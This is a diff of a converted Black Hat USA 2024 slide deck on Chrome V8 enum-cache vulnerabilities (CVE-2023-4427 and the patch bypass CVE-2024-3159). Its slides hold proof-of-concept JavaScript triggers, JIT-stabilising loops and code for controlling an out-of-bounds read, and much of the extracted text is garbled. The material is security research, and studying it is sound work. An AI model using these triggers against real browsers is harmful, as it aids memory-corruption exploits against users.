@@ -8,18 +8,24 @@ year: 2024
 source_pdf: "Black Hat USA 2024 slides/Edouard Bochin & Tao Yan & Bo Qu_Let the Cache Cache and Let the WebAssembly Assemble Knockin' on Chrome's Shell.pdf"
 pages: 102
 sha256: "3508ef0d8c1e76a57c51a92576d70c6ce4b9415d069835f8b5558c0fe5dac049"
-text_chars: 62295
-ocr_pages: 5
+text_chars: 62665
+ocr_pages: 2
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 81.3
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:30:23Z"
+converted_at: "2026-08-12T04:29:55Z"
 ---
 # Let the Cache Cache and Let the WebAssembly Assemble Knockin' on Chrome's Shell
 
 **Speakers:** Edouard Bochin, Tao Yan, Bo Qu  
 **Conference:** Black Hat USA 2024  
 **Source:** `Black Hat USA 2024 slides/Edouard Bochin & Tao Yan & Bo Qu_Let the Cache Cache and Let the WebAssembly Assemble Knockin' on Chrome's Shell.pdf` (102 pages)
+
 
 ## Slide 1
 
@@ -133,19 +139,19 @@ Vuln
 
 ###### `Typical` **`V8 exploit chain`** `targeting Google Chrome` **`with V8 Sandbox`**
 
-```
+\```
 Arbitrary
 Read/Write
 (Inside V8
 Sandbox)
-```
+\```
 
-```
+\```
 V8 Sandbox
 Escape
-```
+\```
 
-```
+\```
 Memory Read/WriteV8 Sandbox
 V8 Vuln
 Corruption(Inside V8 Escape
@@ -159,7 +165,7 @@ Outside outside V8
 /OS KernelExecution
 ChromeSandbox
 Vuln
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -309,13 +315,13 @@ Transitions = NULL
 
 ###### The Basics – Descriptor Array and Transitions
 
-```
+\```
 constobject1 = {};
 object1.a= 1;
 constobject2 = {};
 object2.a= 1;
 object2.b= 1;
-```
+\```
 
 Descriptor Array 0 Map 0 Object 1
 Map Nof descriptors = 0 Map
@@ -346,36 +352,36 @@ Transitions = NULL
 
 ###### The Basics – Descriptor Array and Transitions
 
-```
+\```
 constobject1 = {};
 object1.a= 1;
 constobject2 = {};
 object2.a= 1;
 object2.b= 1;
-```
+\```
 
-```
+\```
 Descriptor Array 0
 Map
 Enum Cache: Empty
-```
+\```
 
-```
+\```
 Descriptor Array 1
 Map
 Enum Cache: Empty
 “a”idx:0SMI
-```
+\```
 
-```
+\```
 Descriptor Array 2
 Map
 Enum Cache: Empty
 “a”idx:0SMI
 “b”Idx:1SMI
-```
+\```
 
-```
+\```
 Map 0
 Nof descriptors = 0
 Descriptor Array
@@ -390,9 +396,9 @@ Map 2
 Nof descriptors = 2
 Descriptor Array
 Transitions = NULL
-```
+\```
 
-```
+\```
 Object 1
 Map
 Properties
@@ -404,7 +410,7 @@ Properties
 Elements
 1
 1
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -414,7 +420,7 @@ Elements
 
 ###### The Basics – Descriptor Array and Transitions
 
-```
+\```
 constobject1 = {};
 object1.a= 1;
 constobject2 = {};
@@ -424,30 +430,30 @@ constobject3 = {};
 object3.a= 1;
 object3.b= 1;
 object3.c= 1;
-```
+\```
 
-```
+\```
 Descriptor Array 2
 Map
 Enum Cache: Empty
 “a”idx:0SMI
 “b”idx:1SMI
-```
+\```
 
-```
+\```
 Descriptor Array 3
 Map
 Enum Cache: Empty
 “a”idx:0SMI
 “b”idx:1SMI
 “c”idx:2SMI
-```
+\```
 
-```
+\```
 “a”
-```
+\```
 
-```
+\```
 Map 1
 Nof descriptors = 1
 Descriptor Array
@@ -462,40 +468,40 @@ Map 3
 Nof descriptors = 3
 Descriptor Array
 Transitions = NULL
-```
+\```
 
-```
+\```
 Object 1
 Map
 Properties
 Elements
 1
-```
+\```
 
-```
+\```
 Object 2
 Map
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 Object 3
 Map
 Properties
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 1
 1
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -544,9 +550,9 @@ Elements
 Builtins_GetKeyedPropertyHandler() 1
 1
 
-```
+\```
 1
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -556,7 +562,7 @@ Builtins_GetKeyedPropertyHandler() 1
 
 ### The Basics – For-in Loop and Enum Cache
 
-```
+\```
 constobject1 = {};
 object1.a= 1;
 constobject2 = {};
@@ -575,9 +581,9 @@ console.log(object2[key]);
 test();
 %OptimizeFunctionOnNextCall(test);
 test();
-```
+\```
 
-```
+\```
 “a”
 Object 1
 Map 1Map
@@ -612,16 +618,16 @@ Descriptor Array
 Properties
 Transitions = NULL
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 1
 1
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -631,15 +637,16 @@ Elements
 
 ###### The Basics – For-in Loop and Enum Cache
 
-```
+\```
 ReduceJSLoadPropertyWithEnumeratedKey()
-```
+\```
 
 #BHUSA @BlackHatEvents
 
 17
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 The Basics - For-in Loop and Enum Cache
@@ -648,8 +655,6 @@ ReduceJSLoadPropertywWithEnumeratedKey ( )
 55: Branch[Unspecified, None] : (62: Iffrue
 /] 68: Branch[Unspecified, None]
 =
-71: lfFalse
-bistkchat
 USA 2024 17
 ```
 
@@ -673,31 +678,31 @@ USA 2024 17
 
 ### CVE-2023-4427
 
-```
+\```
 constobject1 = {}; object1.a= 1;
 constobject2 = {}; object2.a= 1;
 object2.b= 1;
-```
+\```
 
-```
+\```
 constobject3 = {}; object3.a= 1;
 object3.b= 1; object3.c= 1;
 letescape;
-```
+\```
 
-```
+\```
 functiontrigger(callback) {
 for(letkey inobject2) {
 callback();
 escape = object2[key];
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -706,34 +711,34 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 Enum Cache 1
 Map
 Keys[2]
 Indices[2]
-```
+\```
 
-```
+\```
 Descriptor Array 3
 Map
 Enum Cache
 “a”idx:0SMI
 “b”idx:1SMI
 “c”idx:2SMI
-```
+\```
 
-```
+\```
 “a”
 Map 1
 Nof descriptors = 1
 Descriptor Array
 Transition
 “b”
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 2
 Descriptor Array
@@ -743,49 +748,49 @@ Map 3
 Nof descriptors = 3
 Descriptor Array
 Transitions = NULL
-```
+\```
 
-```
+\```
 Object 1
 Map
 Properties
 Elements
 1
-```
+\```
 
-```
+\```
 Object 2
 Map
 Properties
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 Object 3
 Map
 Properties
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 1
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -795,24 +800,24 @@ Elements
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
-```
+\```
 
-```
+\```
 letescape;
-```
+\```
 
-```
+\```
 functiontrigger(callback) {
 for(letkey inobject2) {
 callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -821,13 +826,13 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 ReduceJSLoadPropertyWithEnumeratedKey()
-```
+\```
 
-```
+\```
 pushrbp
 mov
 rbp,rsp
@@ -840,7 +845,7 @@ mov
 QWORD PTR [rbp-0x20],rsi
 cmprsp,QWORDPTR [r13-0x60]
 …
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -850,7 +855,7 @@ cmprsp,QWORDPTR [r13-0x60]
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
 letescape;
 functiontrigger(callback) {
@@ -859,13 +864,13 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 V8::internal::MapUpdater::ConstructNewMap()
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -876,22 +881,22 @@ for(letkey inobject1){}
 Index For-in Loop0
 });
 Indices01OOB memory…
-```
+\```
 
 ###### **`Object 2`**
 
-```
+\```
 Map
 Properties
 Elements
 1
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 2
 DescriptorArray
@@ -906,7 +911,7 @@ Enum Cache 1
 Map
 Keys[2]
 Indices[2]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -916,7 +921,7 @@ Indices[2]
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
 letescape;
 V8::internal::MapUpdater::ConstructNewMap()
@@ -935,19 +940,19 @@ object3.c= 1.1;
 for(letkey inobject1){}
 Index For-in Loop0
 });
-```
+\```
 
 ###### **`Object 2`**
 
-```
+\```
 Map
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 2
 DescriptorArray
@@ -958,15 +963,15 @@ Enum Cache: Empty
 “a”idx:0SMI
 “b”idx:1SMI
 “c”idx:2Double
-```
+\```
 
-```
+\```
 Map2 updated with
 Descriptor Array 4
 because of the Map
 and Descriptor Array
 update of Object3
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -974,45 +979,45 @@ update of Object3
 
 ## Slide 23
 
-```
+\```
 // Object 1,2 and 3 Setup
-```
+\```
 
-```
+\```
 letescape;
-```
+\```
 
 ### CVE-2023-4427
 
 ###### **`Object 2`**
 
-```
+\```
 Map
-```
+\```
 
-```
+\```
 Properties
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 functiontrigger(callback) {
 for(letkey inobject2) {
 callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1021,41 +1026,41 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 Index For-in Loop0
 Indices0OOB memory…
-```
+\```
 
-```
+\```
 Map 2
-```
+\```
 
-```
+\```
 Nof descriptors = 2
 DescriptorArray
 Transition
-```
+\```
 
-```
+\```
 Descriptor Array 4
 Map
 Enum Cache
-```
+\```
 
-```
+\```
 “a”idx:0SMI
 “b”idx:1SMI
 “c”idx:2Double
-```
+\```
 
-```
+\```
 Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1065,7 +1070,7 @@ Indices[1]
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
 letescape;
 functiontrigger(callback) {
@@ -1074,18 +1079,18 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
 ###### `Access Descriptor array via Map`
 
-```
+\```
 …
 mov
 r9d, dwordptr[r8 + 0x17]
 …
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1094,24 +1099,24 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 Index For-in Loop0
 Indices0OOB memory…
-```
+\```
 
 ###### **`Object 2`**
 
-```
+\```
 Map
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 2
 DescriptorArray
@@ -1126,7 +1131,7 @@ Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1136,34 +1141,34 @@ Indices[1]
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
-```
+\```
 
-```
+\```
 letescape;
-```
+\```
 
-```
+\```
 functiontrigger(callback) {
 for(letkey inobject2) {
 callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 Access Enum cache via
 Descriptor array
-```
+\```
 
 …
 mov r9d, dword ptr [r14 + r9 + 0xb]
 …
 Index For-in Loop 0
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1172,31 +1177,31 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 Index For-in Loop0
 Indices0OOB memory…
-```
+\```
 
 ###### **`Object 2`**
 
-```
+\```
 Map
-```
+\```
 
-```
+\```
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 Map 2
-```
+\```
 
-```
+\```
 Nof descriptors = 2
 DescriptorArray
 Transition
@@ -1210,7 +1215,7 @@ Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1220,7 +1225,7 @@ Indices[1]
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
 letescape;
 functiontrigger(callback) {
@@ -1229,9 +1234,9 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 Access Indices array via Enum
 cache
 …
@@ -1239,9 +1244,9 @@ movr9d, dwordptr[r14 + r9 + 7]
 …
 Index For-in Loop0
 Indices0OOB memory…
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1250,19 +1255,19 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 ###### **`Object 2`**
 
-```
+\```
 Map
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 2
 DescriptorArray
@@ -1277,7 +1282,7 @@ Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1287,11 +1292,11 @@ Indices[1]
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
-```
+\```
 
-```
+\```
 letescape;
 functiontrigger(callback) {
 for(letkey inobject2) {
@@ -1299,14 +1304,14 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 Get property value index via
 indices array
-```
+\```
 
-```
+\```
 …
 mov
 r9d, dwordptr[r9 + 0 + 7]
@@ -1316,9 +1321,9 @@ movsxdr12, r11d
 …
 Index For-in Loop0
 Indices0OOB memory…
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1327,22 +1332,22 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 ###### **`Object 2`**
 
-```
+\```
 Map
-```
+\```
 
-```
+\```
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 Map 2
 Nofdescriptors = 2
 DescriptorArray
@@ -1357,7 +1362,7 @@ Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1377,7 +1382,7 @@ CVE-2023-4427 **`Object 2`** `Map Properties // Object 1,2 and 3 Setup Elements 
 
 ### CVE-2023-4427
 
-```
+\```
 // Object 1,2 and 3 Setup
 letescape;
 functiontrigger(callback) {
@@ -1386,14 +1391,14 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 Get property value index via
 indices array
-```
+\```
 
-```
+\```
 …
 mov
 r9d, dwordptr[r9 + r11*4 + 7]
@@ -1403,9 +1408,9 @@ movsxdr15, r12d
 …
 Index For-in Loop1
 Indices0OOB memory…
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1414,26 +1419,26 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 ###### **`Object 2`**
 
-```
+\```
 Map
-```
+\```
 
-```
+\```
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 Map 2
-```
+\```
 
-```
+\```
 Nofdescriptors = 2
 DescriptorArray
 Transition
@@ -1447,7 +1452,7 @@ Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1465,111 +1470,111 @@ CVE-2023-4427 **`Object 2`** `Map Properties // Object 1,2 and 3 Setup Elements 
 
 ## Slide 31
 
-```
+\```
 trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 ### The Patch
 
-```
+\```
 Object 2
-```
+\```
 
-```
+\```
 Map
 Properties
-```
+\```
 
-```
+\```
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 Map 2
-```
+\```
 
-```
+\```
 v8::internal::MapUpdater::ConstructNewMap(){
-```
+\```
 
-```
+\```
 …
-```
+\```
 
-```
+\```
 // If the old descriptors had an enumcache, make sure the new
 ones do too.
-```
+\```
 
-```
+\```
 Nof descriptors = 2
 DescriptorArray
-```
+\```
 
-```
+\```
 Transition
-```
+\```
 
-```
+\```
 if(
-```
+\```
 
 - `…`
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 old_descriptors_->enum_cache()->keys()->length() >0 &&
 new_map->NumberOfEnumerableProperties() > 0
 ) {
-```
+\```
 
-```
+\```
 FastKeyAccumulator::InitializeFastPropertyEnumCache(
 isolate_, new_map, new_map->NumberOfEnumerableProperties());
 }
-```
+\```
 
-```
+\```
 Descriptor Array 4
-```
+\```
 
-```
+\```
 Map
 Enum Cache
-```
+\```
 
-```
+\```
 “a”idx:0SMI
 “b”idx:1SMI
-```
+\```
 
-```
+\```
 “c”idx:2Double
-```
+\```
 
-```
+\```
 Enum Cache 2
-```
+\```
 
-```
+\```
 Map
 Keys[3]
 Indices[3]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1581,63 +1586,63 @@ Indices[3]
 
 ###### **`CVE-2024-3159`**
 
-```
+\```
 constobject4 = {}; object4.a= 1;object4.b= 1; object4.d= 1;
 constobject1 = {}; object1.a= 1;
 constobject2 = {}; object2.a= 1;object2.b= 1;
 constobject3 = {}; object3.a= 1;object3.b= 1; object3.c= 1;
-```
+\```
 
-```
+\```
 letescape;
-```
+\```
 
 ###### **`CVE-2023-4427`**
 
-```
+\```
 constobject1 = {}; object1.a= 1;
 constobject2 = {}; object2.a= 1;object2.b= 1;
 constobject3 = {}; object3.a= 1;object3.b= 1; object3.c= 1;
 letescape;
-```
+\```
 
-```
+\```
 functiontrigger(callback) {
 for(letkey inobject2) {
 callback();
 escape = object2[key];
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 functiontrigger(callback) {
 for(letkey inobject2) {
 callback();
 escape = object2[key];
 }
 }
-```
+\```
 
 - `%PrepareFunctionForOptimization(trigger);`
 
-```
+\```
 trigger(_ => _);
 trigger(_ => _);
 %OptimizeFunctionOnNextCall(trigger);
-```
+\```
 
-```
+\```
 trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1646,7 +1651,7 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1656,21 +1661,21 @@ for(letkey inobject1){}
 
 ### The Bypass - CVE-2024-3159
 
-```
+\```
 constobject1 = {}; object1.a= 1;
 constobject2 = {}; object2.a= 1; object2.b= 1;
 constobject3 = {}; object3.a= 1; object3.b= 1;
 object3.c= 1;
-```
+\```
 
-```
+\```
 constobject4 = {};
 object4.a= 1;
 object4.b= 1;
 object4.d= 1;
-```
+\```
 
-```
+\```
 letescape;
 functiontrigger(callback) {
 for(letkey inobject2) {
@@ -1678,21 +1683,21 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
 %OptimizeFunctionOnNextCall(trigger);
-```
+\```
 
-```
+\```
 trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1702,7 +1707,7 @@ for(letkey inobject1){}
 
 ### CVE-2024-3159
 
-```
+\```
 constobject4 = {}; object4.a= 1; object4.b= 1; object4.d= 1;
 constobject1 = {}; object1.a= 1;
 constobject2 = {}; object2.a= 1; object2.b= 1;
@@ -1714,9 +1719,9 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -1725,7 +1730,7 @@ trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1779,45 +1784,45 @@ Transitions = NULL
 
 ### CVE-2024-3159
 
-```
+\```
 constobject4 = {}; object4.a= 1; object4.b= 1; object4.d= 1;
-```
+\```
 
-```
+\```
 constobject1 = {}; object1.a= 1;
-```
+\```
 
-```
+\```
 constobject2 = {}; object2.a= 1; object2.b= 1;
 constobject3 = {}; object3.a= 1; object3.b= 1; object3.c= 1;
 letescape;
-```
+\```
 
-```
+\```
 functiontrigger(callback) {
 for(letkey inobject2) {
 callback();
 escape = object2[key];
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
 %OptimizeFunctionOnNextCall(trigger);
-```
+\```
 
-```
+\```
 trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1871,32 +1876,32 @@ Transitions = NULL
 
 `Old Object 3ject 3ect 3` CVE-2024-3159 **`Object 3`**
 
-```
+\```
 Old Object 3ject 3ect 3
-```
+\```
 
-```
+\```
 trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 v8::internal::MapUpdater::ConstructNewMap(){
-```
+\```
 
-```
+\```
 …
 // If the old descriptors had an enumcache, make sure the new
 ones do too.
-```
+\```
 
-```
+\```
 if(
-```
+\```
 
-```
+\```
 old_descriptors_->enum_cache()->keys()->length() >0 &&
 new_map->NumberOfEnumerableProperties() > 0
 ) {
@@ -1905,9 +1910,9 @@ isolate_, new_map, new_map->NumberOfEnumerableProperties());
 }
 …
 }
-```
+\```
 
-```
+\```
 Map
 Properties
 Elements
@@ -1925,7 +1930,7 @@ Enum Cache: Empty
 “a”idx:0SMI
 “b”idx:1SMI
 “c”idx:2SMI
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1935,32 +1940,32 @@ Enum Cache: Empty
 
 ### CVE-2024-3159
 
-```
+\```
 Object 3
-```
+\```
 
-```
+\```
 Map
-```
+\```
 
-```
+\```
 trigger(_ => {
 object3.c= 1.1;
 for(letkey inobject1){}
 });
-```
+\```
 
-```
+\```
 v8::internal::MapUpdater::ConstructNewMap(){
-```
+\```
 
-```
+\```
 …
 // If the old descriptors had an enumcache, make sure the new
 ones do too.
-```
+\```
 
-```
+\```
 if(
 old_descriptors_->enum_cache()->keys()->length() >0 &&
 new_map->NumberOfEnumerableProperties() > 0
@@ -1970,20 +1975,20 @@ isolate_, new_map, new_map->NumberOfEnumerableProperties());
 }
 …
 }
-```
+\```
 
-```
+\```
 Properties
 Elements
 1
 1
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 Map 5
 Nof descriptors=3
 Backpointer
@@ -1995,7 +2000,7 @@ Enum Cache: Empty
 “a”idx:0SMI
 “b”idx:1SMI
 “c”idx:2Double
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2125,7 +2130,7 @@ Indices[1]
 
 CVE-2024-3159 **`Object 2`** `Map Properties Elements 1 1 Get property value index via` **`Map 2`** `indices array Nof descriptors=2 … DescriptorArray mov r9d, dword ptr [rcx + r15*2 + 0xb] … Transition Array` **`Descriptor Array 5`** `Map Enum Cache “a” idx:0 SMI “b” idx:1 SMI “c” idx:2 Double Indices 0 OOB memory…` **`Enum Cache 2`** `Map Keys[1] Indices[1]`
 
-```
+\```
 // Object 4, 1,2 and 3 Setup
 letescape;
 functiontrigger(callback) {
@@ -2134,9 +2139,9 @@ callback();
 escape = object2[key];
 }
 }
-```
+\```
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_ => _);
 trigger(_ => _);
@@ -2146,7 +2151,7 @@ object3.c= 1.1;
 for(letkey inobject1){}
 });
 Indices0OOB memory…
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2158,46 +2163,35 @@ Indices0OOB memory…
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-| 4a
-blackhat  _—
-USA 2024
-Let the Cache Cache:
-Exploiting the Enum Cache
-Vulnerability
-```
-
 ## Slide 45
 
 ### Trigger JIT Stably
 
-```
+\```
 %PrepareFunctionForOptimization(trigger);
 trigger(_=>_); trigger(_=>_);
 %OptimizeFunctionOnNextCall(trigger);
-```
+\```
 
-```
+\```
 for(letj= 0; j< 0x200000; j++) {
 trigger(_=>_); trigger(_=>_);
 trigger(_=>_); trigger(_=>_);
 trigger(_=>_); trigger(_=>_);
 }
 ✓
-```
+\```
 
-```
+\```
 for(letj= 0; j< 0x600000; j++) {
 trigger(_=>_); trigger(_=>_);
 }
-```
+\```
 
-```
+\```
 ✗
 Code density is the key!
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2251,7 +2245,7 @@ Indices[7]
 
 ##### Control the Out of Bounds Read – More Details
 
-```
+\```
 // …
 functiontrigger(callback) {
 for(letkey inobject2) {
@@ -2270,26 +2264,26 @@ String.fromCharCode.apply(null,
 0x44, 0x43, 0x42, 0x41);
 #empty_object[string];
 });
-```
+\```
 
-```
+\```
 Index For-in Loop
-```
+\```
 
-```
+\```
 7
-```
+\```
 
-```
+\```
 Object 2
 Map
 Properties
 Elements
 1
 …
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 9
 DescriptorArray
@@ -2301,7 +2295,7 @@ Enum Cache
 ………
 “p9”Idx:10Double
 ………
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2311,7 +2305,7 @@ Enum Cache
 
 ##### Control the Out of Bounds Read – More Details
 
-```
+\```
 // …
 functiontrigger(callback) {
 for(letkey inobject2) {
@@ -2330,60 +2324,60 @@ String.fromCharCode.apply(null,
 0x44, 0x43, 0x42, 0x41);
 #empty_object[string];
 });
-```
+\```
 
-```
+\```
 Index For-in Loop
-```
+\```
 
-```
+\```
 7
-```
+\```
 
-```
+\```
 Indices0OOB memory…
-```
+\```
 
-```
+\```
 Object 2
 Map
 Properties
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 …
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 9
 DescriptorArray
 Transition
-```
+\```
 
-```
+\```
 Descriptor Array 5
 Map
 Enum Cache
-```
+\```
 
-```
+\```
 “p0”idx:0SMI
 “p1”idx:1SMI
 ………
-```
+\```
 
-```
+\```
 Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2393,7 +2387,7 @@ Indices[1]
 
 ##### Control the Out of Bounds Read – More Details
 
-```
+\```
 // …
 functiontrigger(callback) {
 for(letkey inobject2) {
@@ -2412,50 +2406,50 @@ String.fromCharCode.apply(null,
 0x44, 0x43, 0x42, 0x41);
 #empty_object[string];
 });
-```
+\```
 
-```
+\```
 Index For-in Loop7
 Indices0OOB memory…0x41424344…
-```
+\```
 
-```
+\```
 Object 2
 Map
 Properties
 Elements
-```
+\```
 
-```
+\```
 1
-```
+\```
 
-```
+\```
 …
-```
+\```
 
-```
+\```
 Map 2
 Nof descriptors = 9
 DescriptorArray
 Transition
-```
+\```
 
-```
+\```
 Descriptor Array 5
 Map
 Enum Cache
 “p0”idx:0SMI
 “p1”idx:1SMI
 ………
-```
+\```
 
-```
+\```
 Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2465,16 +2459,16 @@ Indices[1]
 
 ##### Control the Out of Bounds Read – More Details
 
-```
+\```
 Object 2
 Map
 Properties
 Elements
 1
 …
-```
+\```
 
-```
+\```
 // …
 functiontrigger(callback) {
 for(letkey inobject2) {
@@ -2493,9 +2487,9 @@ String.fromCharCode.apply(null,
 0x44, 0x43, 0x42, 0x41);
 #empty_object[string];
 });
-```
+\```
 
-```
+\```
 Get property value index via
 Map 2
 indices array
@@ -2519,7 +2513,7 @@ Indices0OOB memory…0x41424344…Enum Cache 2
 Map
 Keys[1]
 Indices[1]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -2556,7 +2550,7 @@ Indices[1]
 
 ##### Control the Out of Bounds Read – More Details
 
-```
+\```
 // …
 functiontrigger(callback) {
 for(letkey inobject2) {
@@ -2575,7 +2569,7 @@ String.fromCharCode.apply(null,
 0x44, 0x43, 0x42, 0x41);
 #empty_object[string];
 });
-```
+\```
 
 #BHUSA @BlackHatEvents
 
